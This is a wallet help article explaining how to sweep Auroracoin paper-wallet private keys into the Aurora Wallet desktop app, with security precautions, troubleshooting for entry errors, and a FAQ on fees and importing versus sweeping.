---
title: "Sweep Auroracoin Paper Wallet Private Keys Safely"
description: "Have an old Auroracoin paper wallet? Learn how to sweep your private keys into Aurora Wallet to secure your AUR with a modern recovery phrase."
primary_keyword: "sweep auroracoin paper wallet"
silo: "recovery"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# How to Sweep Auroracoin Paper Wallet Private Keys Safely

Sweeping an Auroracoin paper wallet is the most effective way to migrate funds from physical "cold storage" into a modern digital environment. A paper wallet typically consists of a printed public address for receiving AUR and a corresponding private key for spending it. While paper wallets were once a popular security method, they are susceptible to physical damage, theft, and accidental loss. By sweeping the balance into Aurora Wallet, you protect your coins with a robust 12 or 24-word recovery phrase, ensuring long-term accessibility. You can find more security tips on the [official Auroracoin security page](https://auroracoin.net/security).

## You'll see this if

*   You have a physical printout containing an Auroracoin address starting with "A".
*   You possess a private key in WIF format (starting with 5, K, or L).
*   You are following the [Auroracoin paper wallet](https://auroracoin.net/recovery/paper-wallet) guide to reclaim old savings.
*   You want to move funds from a "frozen" physical state to an "active" digital wallet for trading or spending.

## Why this happens

Paper wallets function by generating a key pair entirely offline. The private key acts as the literal key to the vault on the blockchain where your AUR is stored. However, paper is a fragile medium. Furthermore, if you ever need to spend just a portion of your funds, using a paper wallet becomes technically difficult and risky due to "change address" mechanics. 

Aurora Wallet is designed to solve these issues by providing a user-friendly interface to "sweep" the entire balance of a paper key into a new, seed-phrase-backed address. This process moves the funds on-chain, effectively retiring the old paper key and consolidating your holdings. For more background on these recovery methods, visit the [Auroracoin paper wallet recovery](https://auroracoin.net/recovery/paper-wallet) documentation.

## The fix

Follow these steps to safely sweep your paper wallet balance.

### 1. Verify the balance
Before exposing your private key to any software, use a public block explorer to check the balance of your public address. This ensures the funds are still there and confirms the exact amount you should expect to see in your wallet.

### 2. Secure your environment
Ensure you are in a private location. Close any browser tabs, screen-sharing apps, or remote-support software. Make sure no cameras (including webcams) are pointed at your screen or the physical paper wallet.

### 3. Open the Sweep Tool
1.  Launch Aurora Wallet and unlock it with your password.
2.  Navigate to the **Recovery** or **Tools** section.
3.  Select the **Sweep Private Key** option.

### 4. Input the Private Key
You have two primary ways to input the key:
*   **Scanning:** Use your computer’s webcam to scan the private key QR code. This is the fastest method and avoids typing errors.
*   **Manual Entry:** Carefully type the character string. Private keys are case-sensitive and use the Base58 alphabet (which excludes 0, O, I, and l). If you get an error, see the [24-error-5-invalid-encoding.md](24-error-5-invalid-encoding.md) guide.

### 5. Confirm and Broadcast
The wallet will show the balance found on the key. Confirm that the destination address belongs to your Aurora Wallet. Click **Sweep Now**. The wallet will broadcast the transaction to the network.

### 6. Wait for Confirmations
Wait for at least six confirmations on the blockchain (usually takes 10-20 minutes). Once confirmed, the AUR will appear in your main balance, and the paper wallet will be empty.

## If that didn't work

If the software reports "Error -5," you likely have a typo in your manual entry. Re-check the characters, paying close attention to similar-looking letters. If the balance shows as zero but you know there are funds, ensure you are on the correct Auroracoin network and not a testnet. 

> [!WARNING]
> Never use a web-based QR scanner or a "online wallet checker" to verify your paper wallet. These tools will steal your private key the moment it is scanned. Only use the official Aurora Wallet application.

## Prevention

To avoid the risks associated with paper-based storage:

*   **Move to Seed Phrases:** Once you have swept your paper wallet, your funds are protected by your [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md). This is much easier to manage than individual paper keys.
*   **Secure Disposal:** Once a paper wallet is swept, mark it clearly as "EMPTY" or destroy it securely. Never send funds to a paper wallet address that has been swept.
*   **Anti-Phishing:** Be aware that scammers often target people looking for "paper wallet recovery" help. Refer to the [35-phishing-seed-scams.md](35-phishing-seed-scams.md) guide to stay safe.

## FAQ

**Can I sweep a paper wallet multiple times?**
No. A sweep moves the *entire* balance of the key. Once the transaction is confirmed, the paper wallet address will have a balance of zero AUR.

**Does sweeping cost a fee?**
Yes. Since sweeping is an on-chain transaction, you must pay a small Auroracoin network fee. The fee is automatically subtracted from the swept amount.

**What is the difference between importing and sweeping?**
Importing simply adds the key to your wallet, leaving the funds at the old address. Sweeping moves the funds to a brand-new address. Aurora Wallet is designed to prioritize sweeping for maximum security.

**My paper wallet is very old. Will it still work?**
Yes. Private keys do not expire. As long as the key is readable and the balance is still at that address on the blockchain, you can sweep it regardless of when it was created.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

## Related articles

- [24-error-5-invalid-encoding.md](24-error-5-invalid-encoding.md)
- [26-import-private-key-wif.md](26-import-private-key-wif.md)
- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
- [36-self-custody-basics.md](36-self-custody-basics.md)
